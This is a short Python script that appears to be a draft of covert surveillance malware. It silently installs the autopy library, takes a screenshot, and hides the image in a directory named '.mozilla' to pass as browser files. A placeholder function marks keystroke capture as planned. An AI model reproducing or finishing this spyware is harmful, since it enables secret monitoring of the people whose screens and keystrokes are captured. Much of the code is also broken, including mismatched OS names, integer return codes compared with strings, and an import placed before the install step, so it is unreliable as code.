#!/usr/bin/python3

#notes: make it where it can tell what OS it is using.
#libraries
import os,platform, subprocess, sys 

# install autpy and libraries
def installAutopy():
    if platform.system() == "win32": 
        if os.system('pip3 show autpy') == "autopy":
            pass
        else:
            os.system('pip3 -q install autopy --user; ')
    elif platform.system() == "darwin":
        if os.system('pip3 -q list | grep autopy') == "autopy":
            pass
        else:
            os.system('pip3 -q install autopy --user; ')
    elif platform.system() == "Linux":
        if os.system('pip3 -q list | grep autopy') == "autopy":
            pass
        else:
            os.system('pip3 -q install autopy --user; ')
    else:
        print("Not a valid OS")
        quit()

import autopy
#functions

def screenshotsLinux():
    os.mkdir('/tmp/.mozilla')
    b = autopy.bitmap.capture_screen()
    b.save("/tmp/.mozilla/ss.png")

def screenshotsWin():
    os.mkdir('/tmp/.mozilla')
    b = autopy.bitmap.capture_screen()
    b.save("/tmp/.mozillass.png")

def keystrokes():
    print ('In the works')


#checks what OS it is
if platform.system() == "win32":
    installAutopy() 
    screenshotsWin()
elif platform.system() == "darwin":
    installAutopy()
    screenshotsLinux() 
elif platform.system() == "Linux":
    installAutopy()
    screenshotsLinux()
else:
    print("Not a valid OS")
    quit()